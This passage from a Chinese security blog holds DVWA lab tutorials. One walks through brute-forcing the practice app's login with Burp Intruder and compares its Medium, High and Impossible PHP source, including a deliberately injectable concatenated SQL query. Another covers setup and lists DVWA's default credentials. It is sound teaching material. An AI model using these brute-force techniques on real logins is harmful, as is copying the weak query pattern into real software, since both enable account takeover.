alt></p><p>上面是SQL注入，可是这道题是让暴力破解的，第二种方法：<br>Burp抓包发送到Intruder模块，假设已知管理员用户名admin，需要对password暴破，把password的参数设置为需要破解的变量，只有一个类型使用狙击手模式即可。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073445949.png" alt></p><p>简单模式，配置字典，也可以加载外部字典</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073457658.png" alt></p><p>也可以设置从响应消息中提取结果</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073508810.png" alt></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073518119.png" alt></p><p>根据Welcome为对号或者Length不同找到正确的密码</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073529792.png" alt></p><h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Login&apos; ] ) ) &#123;</span><br><span class="line">// Sanitise username input</span><br><span class="line">$user = $_GET[ &apos;username&apos; ];</span><br><span class="line">$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Sanitise password input</span><br><span class="line">$pass = $_GET[ &apos;password&apos; ];</span><br><span class="line">$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">// Check the database</span><br><span class="line">$query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;</span><br><span class="line">// Get users details</span><br><span class="line">$row = mysqli_fetch_assoc( $result );</span><br><span class="line">$avatar = $row[&quot;avatar&quot;];</span><br><span class="line"></span><br><span class="line">// Login successful</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Login failed</span><br><span class="line">sleep( 2 );</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>跟LOW相比，username和password经过了mysqli_real_escape_string()函数过滤，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义，实验环境为MySQL5.7.21，所以无法进行SQL注入。<br>以及如果密码错误的话会sleep( 2 )，每一次的请求包响应时间由毫秒基本变成了2~10秒。这样大大的增加了我们破解出密码锁需要的时间。步骤与LOW模式一致。<br>这里就当作不知道用户名和密码，添加两个字典用集束炸弹模式用笛卡儿积的方式同时暴破两个参数：</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073600338.png" alt></p><p>设置payload1，2对应的用户名密码字典</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073609811.png" alt></p><p>同样在响应头提取welcome</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073619831.png" alt></p><p>等待筛选到的welcome即可</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073630632.png" alt></p><h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Login&apos; ] ) &amp;&amp; isset ($_POST[&apos;username&apos;]) &amp;&amp; isset ($_POST[&apos;password&apos;]) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Sanitise username input</span><br><span class="line">$user = $_POST[ &apos;username&apos; ];</span><br><span class="line">$user = stripslashes( $user );</span><br><span class="line">$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Sanitise password input</span><br><span class="line">$pass = $_POST[ &apos;password&apos; ];</span><br><span class="line">$pass = stripslashes( $pass );</span><br><span class="line">$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">// Default values</span><br><span class="line">$total_failed_login = 3;</span><br><span class="line">$lockout_time = 15;</span><br><span class="line">$account_locked = false;</span><br><span class="line"></span><br><span class="line">// Check the database (Check user information)</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">// Check to see if the user has been locked out.</span><br><span class="line">if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &apos;failed_login&apos; ] &gt;= $total_failed_login ) ) &#123;</span><br><span class="line">// User locked out. Note, using this method would allow for user enumeration!</span><br><span class="line">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">// Calculate when the user would be allowed to login again</span><br><span class="line">$last_login = strtotime( $row[ &apos;last_login&apos; ] );</span><br><span class="line">$timeout = $last_login + ($lockout_time * 60);</span><br><span class="line">$timenow = time();</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// Check to see if enough time has passed, if it hasn&apos;t locked the account</span><br><span class="line">if( $timenow &lt; $timeout ) &#123;</span><br><span class="line">$account_locked = true;</span><br><span class="line">// print &quot;The account is locked&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Check the database (if username matches the password)</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR);</span><br><span class="line">$data-&gt;bindParam( &apos;:password&apos;, $pass, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">// If its a valid login...</span><br><span class="line">if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123;</span><br><span class="line">// Get users details</span><br><span class="line">$avatar = $row[ &apos;avatar&apos; ];</span><br><span class="line">$failed_login = $row[ &apos;failed_login&apos; ];</span><br><span class="line">$last_login = $row[ &apos;last_login&apos; ];</span><br><span class="line"></span><br><span class="line">// Login successful</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line"></span><br><span class="line">// Had the account been locked out since last login?</span><br><span class="line">if( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Reset bad login count</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">// Login failed</span><br><span class="line">sleep( rand( 2, 4 ) );</span><br><span class="line"></span><br><span class="line">// Give the user some feedback</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">// Update bad login count</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Set the last login time</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>可以看到代码中加入了stripslashes()函数对用户名和密码去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个。<br>同时加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token。</p><p>每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。</p><p>由于加入了Anti-CSRFtoken预防无脑爆破，token的值三随机变化的用burp不容易爆破成功。所以需要自己写python脚本html页面中抓取user_token的值然后进行爆破。由于python还没有学，这里先留个坑以后填Impossible级别</p><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Login&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line">// Sanitise username input</span><br><span class="line">$user = $_POST[ &apos;username&apos; ];</span><br><span class="line">$user = stripslashes( $user );</span><br><span class="line">$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">// Sanitise password input</span><br><span class="line">$pass = $_POST[ &apos;password&apos; ];</span><br><span class="line">$pass = stripslashes( $pass );</span><br><span class="line">$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line">// Default values</span><br><span class="line">$total_failed_login = 3;</span><br><span class="line">$lockout_time = 15;</span><br><span class="line">$account_locked = false;</span><br><span class="line">// Check the database (Check user information)</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row = $data-&gt;fetch();</span><br><span class="line">// Check to see if the user has been locked out.</span><br><span class="line">if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &apos;failed_login&apos; ] &gt;= $total_failed_login ) ) &#123;</span><br><span class="line">// User locked out. Note, using this method would allow for user enumeration!</span><br><span class="line">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span><br><span class="line">// Calculate when the user would be allowed to login again</span><br><span class="line">$last_login = strtotime( $row[ &apos;last_login&apos; ] );</span><br><span class="line">$timeout = $last_login + ($lockout_time * 60);</span><br><span class="line">$timenow = time();</span><br><span class="line">/*</span><br><span class="line">print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">*/</span><br><span class="line">// Check to see if enough time has passed, if it hasn&apos;t locked the account</span><br><span class="line">if( $timenow &lt; $timeout ) &#123;</span><br><span class="line">$account_locked = true;</span><br><span class="line">// print &quot;The account is locked&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// Check the database (if username matches the password)</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR);</span><br><span class="line">$data-&gt;bindParam( &apos;:password&apos;, $pass, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row = $data-&gt;fetch();</span><br><span class="line">// If its a valid login...</span><br><span class="line">if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123;</span><br><span class="line">// Get users details</span><br><span class="line">$avatar = $row[ &apos;avatar&apos; ];</span><br><span class="line">$failed_login = $row[ &apos;failed_login&apos; ];</span><br><span class="line">$last_login = $row[ &apos;last_login&apos; ];</span><br><span class="line">// Login successful</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">// Had the account been locked out since last login?</span><br><span class="line">if( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">// Reset bad login count</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">// Login failed</span><br><span class="line">sleep( rand( 2, 4 ) );</span><br><span class="line">// Give the user some feedback</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;</span><br><span class="line">// Update bad login count</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line">// Set the last login time</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>相比于High难度，当输入错误failed_login=3，$last_login + ($lockout_time * 60); 锁定15分钟以及随机sleep(rand(2,4)),防止了爆破。<br>而且在与数据库交互时采用PDO（PHP Data Object，PHP数据对象）机制。<br>因为两次传输，前一次传一个sql模板，第二次传查询参数，会把第二步传入的参数只做查询参数处理，不做语义解释，这样注入的条件就算执行了，也不会得到查询结果。</p><p>当调用 prepare() 时，查询语句已经发送给了数据库服务器，此时只有占位符 ? 发送过去，没有用户提交的数据；当调用到 execute()时，用户提交过来的值才会传送给数据库，他们是分开传送的，两者独立的，SQL攻击者没有一点机会。</p><p><a href="https://link.jianshu.com/?t=http://www.freebuf.com/articles/web/116437.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之Brute Force</a></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA学习（一）环境搭建</title>
      <link href="/2018/05/01/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2018/05/01/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（一）环境搭建<br><a id="more"></a></p><h1 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a>DVWA简介</h1><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（一）环境搭建/图片.png.png" alt="图片.png"></p><p>DVWA共有十个模块，分别是:<br>1.Brute Force（暴力（破解））<br>2.Command Injection（命令行注入）<br>3.CSRF（跨站请求伪造）<br>4.File Inclusion（文件包含）<br>5.File Upload（文件上传）<br>6.Insecure CAPTCHA （不安全的验证码）<br>7.SQL Injection（SQL注入）<br>8.SQL Injection（Blind）（SQL盲注）<br>9.XSS（Reflected）（反射型跨站脚本）<br>10.XSS（Stored）（存储型跨站脚本）</p><p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。环境搭建</p><p>安装ubuntu-server16.04虚拟机NAT模式。<br>Apache/2.4.18 (Ubuntu)<br>PHP 5.6.35-1+ubuntu16.04.1+deb.sury.org+1 (cli)<br>MySQL5.7.21-0ubuntu0.16.04.1<br>查看虚拟机动态ip</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（一）环境搭建/20190326071352963.png" alt></p><p>外部主机成功访问虚拟机服务器中的DVWA网站：</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（一）环境搭建/20190326071423525.png" alt></p><p>DVWA默认的用户有5个，用户名密码如下（一个足以）：</p><p>admin/password<br>gordonb/abc123<br>1337/charley<br>pablo/letmein<br>smithy/password</p><p>数据库中的密码用了md5加密</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（一）环境搭建/20190326071459403.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite系列之User options模块</title>
      <link href="/2018/04/29/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BUser-options%E6%A8%A1%E5%9D%97/"/>
      <url>/2018/04/29/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BUser-options%E6%A8%A1%E5%9D%97/</url>
      
